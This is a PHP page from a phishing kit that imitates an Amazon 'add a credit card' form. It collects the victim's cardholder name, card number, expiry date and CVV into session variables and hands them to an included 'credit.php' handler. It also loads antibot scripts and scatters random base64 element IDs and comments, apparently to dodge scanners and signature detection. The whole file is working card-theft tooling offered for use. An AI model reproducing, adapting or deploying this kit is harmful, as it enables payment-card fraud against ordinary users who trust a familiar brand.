<?php
ob_start(); 
session_start();
date_default_timezone_set('GMT'); 
error_reporting(0); 
################## Dexter #################
include('../function/configs.php');
################## Dexter #################
if($autolang == 1 ){
include('../function/get_lang.php');
include "../function/lang".$_SESSION['SHADOW-Z118'];}
elseif($Langage_es == 1 ){include "../function/lang/es.php";}
elseif($Langage_de == 1 ){include "../function/lang/de.php";}
elseif($Langage_en == 1 ){include "../function/lang/en.php";}
elseif($Langage_fr == 1 ){include "../function/lang/fr.php";}
elseif($Langage_it == 1 ){include "../function/lang/it.php";}
else {include "../function/lang/en.php";}
################## Dexter #################
$_SESSION['_nameoncard_'] = $_POST['cardholder'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate_month']."/".$_POST['expdate_year'];
$_SESSION['_csc_']        = $_POST['cvv2_number'];		
$FULL = $_POST['cardnumber'];
################## Dexter #################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($FULL)== false) {
        include('../function/credit.php');
}}
################################ Dexter ################################
if($antibots !== 1 ){}else{
include "antibots/antibots1.php";
include "antibots/antibots2.php";
include "antibots/antibots3.php";}
################################ Dexter ################################
?>
<html>
<!-- 
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
-->
<head>
<link href="../files/css/logo.ico" rel="shortcut icon" type="image/x-icon">
<title> <?php echo "$richard_azzouz_1";?></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8">
<link rel="icon" type="image/x-icon" href="../files/images/favicon.ico" />  
<link rel="stylesheet" href="../files/css/xnxx.css">
<link rel="stylesheet" type="text/css" href="../files/css/details.css">
<link rel="stylesheet" type="text/css" href="../files/css/cc.css">
</head>
  <link id="<?=base64_encode(md5(rand(00,1000)));?>" type="text/css" href="../files/css/xbrazzerDexter^_^.css" rel="stylesheet">
<?php include "../function/footer.php"; ?>
<div id="a-page">
    <div align="center" style="margin-top: 3%;">
        <h1 id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-size-medium">
            <a data-testid="cpe-mpo-header-yourAccount">
                <?php echo $zab_a;?>
            </a>
            <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="breadcrumbArrow">
                ›
            </span>
            <span id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-color-state">
               <?php echo $zab_b;?>
            </span>
			<span id="<?=base64_encode(md5(rand(00,1000)));?>" class="breadcrumbArrow">
                ›
            </span>
            <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="breadcrumbArrow">
               <?php echo $zab_c;?>
            </span>
        </h1>
    </div>
<div id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-section a-padding-medium auth-workflow" style="margin-top: 7px;">
      <div class="a-section">
<div class="a-section a-spacing-base auth-pagelet-container">
  <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section"> 
 <form method="post" id="validation" action="">
  <script type="text/javascript">	
function xForm(){
	if (document.getElementById('aa').value.length < 6 ) {
		document.getElementById('aa').className = "a-input-text a-span12 auth-autofocus auth-required-field error";
		document.getElementById('aa').focus();
		return false;
	}else{
		document.getElementById('aa').className = "a-input-text a-span12 auth-autofocus auth-required-field";
	};


	if (document.getElementById('bb').value.length < 6 ) {
		document.getElementById('bb').className = "a-input-text a-span12 auth-autofocus auth-required-field error";
		document.getElementById('bb').focus();
		return false;
	}else{
		document.getElementById('bb').className = "a-input-text a-span12 auth-autofocus auth-required-field";
	};
	
	if (document.getElementById('cc').value.length < 6 ) {
		document.getElementById('cc').className = "a-input-text a-span12 auth-autofocus auth-required-field error";
		document.getElementById('cc').focus();
		return false;
	}else{
		document.getElementById('cc').className = "a-input-text a-span12 auth-autofocus auth-required-field";
	};	
	if (document.getElementById('dd').value.length < 6 ) {
		document.getElementById('dd').className = "a-input-text a-span12 auth-autofocus auth-required-field error";
		document.getElementById('dd').focus();
		return false;
	}else{
		document.getElementById('dd').className = "a-input-text a-span12 auth-autofocus auth-required-field";
	};	
document.getElementById('loading').style.display = "block";
document.getElementById('xbootn').style.display = "none";

}
</script>	
   <div class="a-section">
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-box" style="border-radius: 6px;box-shadow: 0 1px 1px rgba(0,0,0,0.5);"><div class="a-box-inner a-padding-extra-large">
	   <br>        
	   <div aria-live="polite" class="a-row a-expander-container a-spacing-base a-expander-inline-container pmts-add-cc add-instrument-form-expander"><div class="a-fixed-right-grid"><div class="a-fixed-right-grid-inner" style="padding-right:198px"><div class="a-fixed-right-grid-col a-col-left" style="padding-right:2%;float:left;"><div class="a-row a-spacing-base">
	   <h3 class="a-spacing-small" style="margin-top: -18px;width: 140%;"><?php echo "$goverment_is_bad_4";?></h3><div class="a-row">
	   <div style=" width: 140%; " class="a-row"><?php echo $Azzouz1;?></div></div></div></div><div class="a-text-right a-fixed-right-grid-col a-col-right" style="width:198px;margin-right: -198px;float:left;top: 96px;right: 35px;position: inherit;"><div class="a-section a-spacing-none a-text-right pmts-composite-logo-row"><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: 0px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: -45px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: -90px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: -135px;"></span></div><div class="a-section a-spacing-none a-text-right pmts-composite-logo-row"><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: -180px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: -225px; margin-right: 6px;"></span><span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png'); background-position: -270px; margin-right: 6px;"></span></div></div></div></div><div aria-expanded="true" class="a-expander-content a-spacing-base a-expander-inline-content a-expander-inner"><div id="pp-K8-21" data-pmts-component-id="pp-K8-15" class="a-section pmts-portal-component pmts-portal-components-pp-K8-15"><input type="hidden" name="ie" value="UTF-8"><div id="pp-K8-23" class="a-row a-spacing-base a-hidden aok-hidden"><div class="a-column a-span10"><div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem.</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><ul class="a-unordered-list a-vertical"></ul></div></div></div></div></div>
	   <div class="a-row a-spacing-base" style="margin-top: -23px;"></div>
	   <div class="a-row a-spacing-base"><div class="a-section a-spacing-none pmts-inline-field-block" style="margin-top: -30px;">
	   <label for="pp-K8-24" class="a-form-label"><?php echo $Azzouz3;?></label><input type="text" maxlength="50" id="aa" autocomplete="off" name="cardholder" style="width:  209px;"></div>
<div class="a-row a-spacing-base"><br><br>
	   
	   <div class="a-section a-spacing-none pmts-inline-field-block" style="margin-top: -6px;">
    <label for="pp-K8-25" class="a-form-label">Numéro de carte</label>
<script type="text/javascript" src="../files/css/jquery.min.js"></script><script type="text/javascript" src="../files/css/jquery.payment.js"></script>
<input style=" width: 209px; height: 31px;" type="tel" id="cc_number" placeholder="" autocomplete="off" required="" pattern="[2-7][0-9 ]{11,20}" name="cardnumber" class="valid">
<input id="MjI5MWQyZWMzYjMwNDhkMWE2Zjg2YzJjNDU5MWI3ZTA=" type="hidden" required="" size="25" placeholder="Card holder name" name="cc_holder">
<input id="MmNhNjVmNThlMzVkOWFkNDViZjdmM2FlNWNmZDA4ZjE=" type="hidden" name="header" value="">
</div><br><br>
<br><div class="a-section a-spacing-none pmts-inline-field-block"><label for="pp-K8-25" class="a-form-label"><?php echo "$goverment_is_bad_10";?></label> 
	  <span> 
<select style="padding-right: 10px;padding-left: 20px;" name="expdate_month" required="" 02="">
<option value="--" selected=""> <?php echo "$goverment_is_bad_11";?> </option>
<option value="02">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>&nbsp;
<select id="MzYyMWYxNDU0Y2FjZjk5NTUzMGVhNTM2NTJkZGY4ZmI=" style="
    padding-right: 10px;
    padding-left: 20px;
" name="expdate_year" size="1" 2015="">
<option value="----" selected=""><?php echo "$goverment_is_bad_12";?></option>
<option value="2017">2017</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2026">2027</option>
<option value="2026">2028</option>
<option value="2026">2029</option>
<option value="2026">2030</option>
</select>
</span>
</div>
<br><br><br>
<div class="a-section a-spacing-none pmts-inline-field-block" style=" margin-top: 5px;">
	   <label for="pp-K8-24" class="a-form-label">CVV</label><input id="MGEwOWM4ODQ0YmE4ZjA5MzZjMjBiZDc5MTEzMGQ2YjY=" type="text" class=""  placeholder="CVV2" maxlength="4" name="cvv2_number" size="6" style="background-image: url(../files/images/sprites_cc_global.png);background-position: 76px 93.2%;background-repeat: no-repeat;padding-right: 38px;"></div>
<br><br>
<div id="MGY4NDBiZTliOGRiNGQzZmJkNWJhMmNlNTkyMTFmNTU=" class="tiny" style="margin-top: -8px;">  <?php echo "$goverment_is_bad_09";?></div>

<br>



</div>
	   
	   <div data-a-input-name="ppw-updateEverywhereAddCreditCard" class="a-checkbox pmts-update-everywhere-checkbox a-spacing-base" style="/* margin-top: 25px; */"><label for="pp-K8-32"><input id="pp-K8-32" type="checkbox" name="ppw-updateEverywhereAddCreditCard" value="updateEverywhereAddCreditCard" checked=""><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label"><?php echo $Azzouz8;?><span class="a-letter-space"></span><span class="a-declarative" data-action="a-tooltip" data-a-tooltip="{&quot;header&quot;:&quot;What's this&quot;,&quot;content&quot;:&quot;We'll make this your default payment method for all Amazon services. For example, 1-Click purchases, Pay with Amazon, and Amazon memberships, like Prime.&quot;,&quot;inlineContent&quot;:&quot;We'll make this your default payment method for all Amazon services. For example, 1-Click purchases, Pay with Amazon, and Amazon memberships, like Prime.&quot;,&quot;activate&quot;:&quot;onclick&quot;}"></span></span></label></div></div></div></div>
<hr style="margin-top: -15px;">         
		 <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-extra-large">
           <center> <span  id="<?=base64_encode(md5(rand(00,1000)));?>"class="a-button a-button-span12 a-button-primary" role="button"><span class="a-button-inner">
			<input onclick="return xForm()" id="signInSubmit" tabindex="5" class="a-button-input" type="submit">
			 <span id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-button-text" aria-hidden="true"><?php echo "$goverment_is_bad_18";?></span></span></span></center>
          </div>
        </div></div>
      </div></form>
  </div>
</div>
      </div>
      <div id="right-2">
      </div>
     <br>	   
	   <div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-section a-spacing-top-extra-large">
<div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-divider a-divider-section"><div id="<?=base64_encode(md5(rand(00,1000)));?>" class="a-divider-inner"></div></div><center><ul>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>" class="nav_first" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Australia</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Brazil</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Canada</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">China</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">France</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Germany</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">India</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Italy</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Japan</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Mexico</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">Spain</a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_last" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">United Kingdom</a></li>
</ul><ul><li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_first" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;">&nbsp;</li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_first" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a" href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;">  <?php echo "$goverment_is_bad_19";?> </a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a"href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;"><?php echo "$goverment_is_bad_20";?></a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><a class="nav_a"href="#" style="box-sizing: border-box; text-decoration-line: none; color: rgb(0, 102, 192); padding: 0px 0.6em;"><?php echo "$goverment_is_bad_21";?></a></li>
	<li id="<?=base64_encode(md5(rand(00,1000)));?>"class="nav_last" style="box-sizing: border-box; list-style: disc; word-wrap: break-word; margin: 0px; display: inline; color: rgb(148, 148, 148); font-family: arial, sans-serif; font-size: 11px;"><?php echo "$goverment_is_bad_1";?></li>
</ul>
</center>
      </div>
    </div>
<!-- 
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
<?=base64_encode(md5(rand(00,1000)));?>
-->	
  </div>